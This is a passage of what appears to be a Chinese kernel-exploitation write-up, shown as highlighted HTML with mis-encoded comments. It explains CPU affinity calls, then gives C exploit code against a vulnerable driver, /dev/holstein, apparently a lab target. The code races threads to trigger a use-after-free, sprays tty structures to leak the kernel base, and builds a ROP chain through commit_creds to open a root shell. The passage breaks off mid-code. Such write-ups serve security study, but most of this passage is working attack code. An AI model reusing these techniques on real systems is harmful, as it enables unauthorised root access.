property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token keyword">int</span> <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">,</span> <span class="token class-name">size_t</span> cpusetsize<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è®¾ç½®è¿›ç¨‹å·ä¸ºpidçš„è¿›ç¨‹è¿è¡Œåœ¨maskæ‰€è®¾å®šçš„CPUä¸Š</span><span class="token keyword">int</span> <span class="token function">sched_getaffinity</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">,</span> <span class="token class-name">size_t</span> cpusetsize<span class="token punctuation">,</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å¾—pidæ‰€æŒ‡ç¤ºçš„è¿›ç¨‹çš„CPUä½æ©ç ,å¹¶å°†è¯¥æ©ç è¿”å›åˆ°maskæ‰€æŒ‡å‘çš„ç»“æ„ä¸­</span><span class="token keyword">int</span> <span class="token function">sched_getcpu</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å½“å‰è¿›ç¨‹è¿è¡Œåœ¨å“ªä¸ªCPUä¸Š</span><span class="token comment">/*pid: è¿›ç¨‹å·ï¼Œè‹¥ä¸º0åˆ™è¡¨æ˜æ˜¯å½“å‰è¿›ç¨‹cpusetsize: æ˜¯maskæ‰€æŒ‡çš„æ•°çš„é•¿åº¦ï¼Œé€šå¸¸è®¾ä¸ºsizeof(cpu_set_t)mask: CPUä½å›¾*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>è‹¥è¦å°†çº¿ç¨‹å’ŒCPUæ ¸ç»‘å®šï¼Œæœ‰<code>pthread_setaffinity_np</code>å¯ä¾›ä½¿ç”¨</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token keyword">int</span> <span class="token function">pthread_setaffinity_np</span><span class="token punctuation">(</span><span class="token class-name">pthread_t</span> thread<span class="token punctuation">,</span> <span class="token class-name">size_t</span> cpusetsize<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>cpuset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">pthread_getaffinity_np</span><span class="token punctuation">(</span><span class="token class-name">pthread_t</span> thread<span class="token punctuation">,</span> <span class="token class-name">size_t</span> cpusetsize<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>cpuset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*åŒç†*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>sched_setaffinity</code>ä¸<code>pthread_setaffinity_np</code>éƒ½æ˜¯ç»‘å®š CPU æ ¸å¿ƒçš„å‡½æ•°ï¼Œä½†å®ƒä»¬ä¹‹é—´å­˜åœ¨ä¸€äº›å¼‚åŒ</p></li></ul><ol><li>sched_getaffinityæ˜¯ç”¨æ¥ç»‘å®šè¿›ç¨‹çš„ï¼Œpthread_getaffinity_npæ˜¯ç”¨æ¥ç»‘å®šçº¿ç¨‹çš„ã€‚ä½†æ˜¯æˆ‘ä»¬çŸ¥é“ï¼Œ<strong>ç»‘å®šè¿›ç¨‹ä»æœ¬è´¨ä¸Šæ¥è®²ï¼Œä¹Ÿæ˜¯ç»‘å®šçº¿ç¨‹</strong>ã€‚</li><li>å¯ä»¥å‘ç°ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸ä¸€æ ·çš„ï¼Œsched_getaffinityä¼ å…¥çš„æ˜¯è¿›ç¨‹IDï¼Œpthread_getaffinity_npä¼ å…¥çš„æ˜¯çº¿ç¨‹IDã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªçº¿ç¨‹ä¼šæœ‰ä¸¤ä¸ªIDï¼Œä¸€ä¸ªå«è¿›ç¨‹IDï¼Œä¸€ä¸ªå«çº¿ç¨‹IDï¼Œè¿›ç¨‹IDåœ¨å†…æ ¸ä¸­æ˜¯ç‹¬ç«‹çš„ï¼Œç”±å†…æ ¸ç»´æŠ¤ï¼Œçº¿ç¨‹IDåœ¨è¿›ç¨‹ä¸­æ˜¯ç‹¬ç«‹çš„ï¼Œç”±è¿›ç¨‹ç»´æŠ¤ã€‚è¿›ç¨‹IDåœ¨ä¸åŒè¿›ç¨‹é—´æ˜¯æœ‰æ•ˆçš„ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥åœ¨è¿›ç¨‹ä¸­ä¿®æ”¹å…¶ä»–è¿›ç¨‹çš„å±æ€§ï¼Œè€Œçº¿ç¨‹IDæ— æ³•åœ¨ä¸åŒè¿›ç¨‹é—´å…±äº«ã€‚<strong>âˆ´è¿™ä¸¤ä¸ªå‡½æ•°æœ€å¤§çš„åŒºåˆ«æ˜¯ï¼Œä½ å¯ä»¥åœ¨è¿›ç¨‹Aè°ƒç”¨sched_getaffinityä¿®æ”¹æ‰è¿›ç¨‹Bä¸­çš„æŸä¸ªçº¿ç¨‹çš„ç»‘å®šæ ¸ã€‚</strong></li><li>å°½ç®¡ sched_setaffinity çš„å‚æ•°ä¸­æœ‰ä¸€ä¸ª pidï¼Œä½†å®ƒå®é™…ä¸Šå¯ä»¥ç”¨äºè®¾ç½®å½“å‰çº¿ç¨‹çš„äº²å’Œæ€§ï¼Œè€Œä¸ä»…ä»…æ˜¯è¿›ç¨‹ã€‚è¿™æ˜¯å› ä¸ºçº¿ç¨‹å’Œè¿›ç¨‹åœ¨ Linux ä¸­å…·æœ‰å…±äº«çš„ç‰¹æ€§ã€‚</li></ol><h2 id="ä¸‰-EXP"><a href="#ä¸‰-EXP" class="headerlink" title="(ä¸‰)EXP"></a>(ä¸‰)EXP</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff810b13c5</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSD_RET</span> <span class="token expression"><span class="token number">0xffffffff8165094b</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_PP_RET</span> <span class="token expression"><span class="token number">0xffffffff8130f6c9</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PUSH_RDX_POP_RSP_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff81137da7</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token operator">=</span><span class="token number">0xffffffff81072580</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff810723e0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">race</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> num1<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/tmp"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> num2<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/tmp"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>num1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>num2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">gettid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span><span class="token punctuation">)</span><span class="token punctuation">,</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">==</span>num1 <span class="token operator">||</span> fd<span class="token operator">==</span>num2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>num2<span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] race Finished,fd:%x\n"</span><span class="token punctuation">,</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> fd<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>fd <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">pthread_t</span> th1<span class="token punctuation">,</span>th2<span class="token punctuation">;</span><span class="token class-name">cpu_set_t</span> th1_cpu<span class="token punctuation">,</span>th2_cpu<span class="token punctuation">;</span><span class="token keyword">int</span> fd1<span class="token punctuation">,</span>fd2<span class="token punctuation">;</span><span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th1_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th2_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>th1_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>th2_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] UAF#1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th1<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>race<span class="token punctuation">,</span><span class="token operator">&amp;</span>th1_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th2<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>race<span class="token punctuation">,</span><span class="token operator">&amp;</span>th2_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_join</span><span class="token punctuation">(</span>th1<span class="token punctuation">,</span><span class="token operator">&amp;</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_join</span><span class="token punctuation">(</span>th2<span class="token punctuation">,</span><span class="token operator">&amp;</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] fd1:%x fd2:%x\n"</span><span class="token punctuation">,</span>fd1<span class="token punctuation">,</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span> check<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"X1NRI"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>check<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>check<span class="token punctuation">,</span><span class="token string">"X1NRI"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] Race Condition Successfully!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> tty1_fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>tty1_fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/ptmx Opened\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">read</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> heap<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x38</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0x5401</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"UAF#1 spray Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>koff<span class="token operator">=</span>koff<span class="token operator">-</span><span class="token number">0xc3afe0</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span>heap<span class="token operator">=</span>heap<span class="token operator">-</span><span class="token number">0x38</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff => 0x%lx\n"</span><span class="token punctuation">,</span>koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] ropchain => 0x%lx\n"</span><span class="token punctuation">,</span>heap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x40</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_PP_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSD_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span>koff<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">]</span><span class="token operator">=</span>PUSH_RDX_POP_RSP_POP_RBP_RET<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span>ropchain<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] UAF#2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">pthread_t</span> th3<span class="token punctuation">,</span>th4<span class="token punctuation">;</span><span class="token class-name">cpu_set_t</span> th3_cpu<span class="token punctuation">,</span>th4_cpu<span class="token punctuation">;</span><span class="token keyword">int</span> fd3<span class="token punctuation">,</span>fd4<span class="token punctuation">;</span><span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th3_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th4_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>th3_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>th4_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th3<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>race<span class="token punctuation">,</span><span class="token operator">&amp;</span>th3_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th4<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>race<span class="token punctuation">,</span><span class="token operator">&amp;</span>th4_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_join</span><span class="token punctuation">(</span>th3<span class="token punctuation">,</span><span class="token operator">&amp;</span>fd3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_join</span><span class="token punctuation">(</span>th4<span class="token punctuation">,</span><span class="token operator">&amp;</span>fd4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] fd3:%x fd4:%x\n"</span><span class="token punctuation">,</span>fd3<span class="token punctuation">,</span>fd4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">"X1NRI"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>check<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>check<span class="token punctuation">,</span><span class="token string">"X1NRI"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] Race Condition Successfully!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> tty_fd2<span class="token operator">=</span><span class="token function">open</span><span class="token 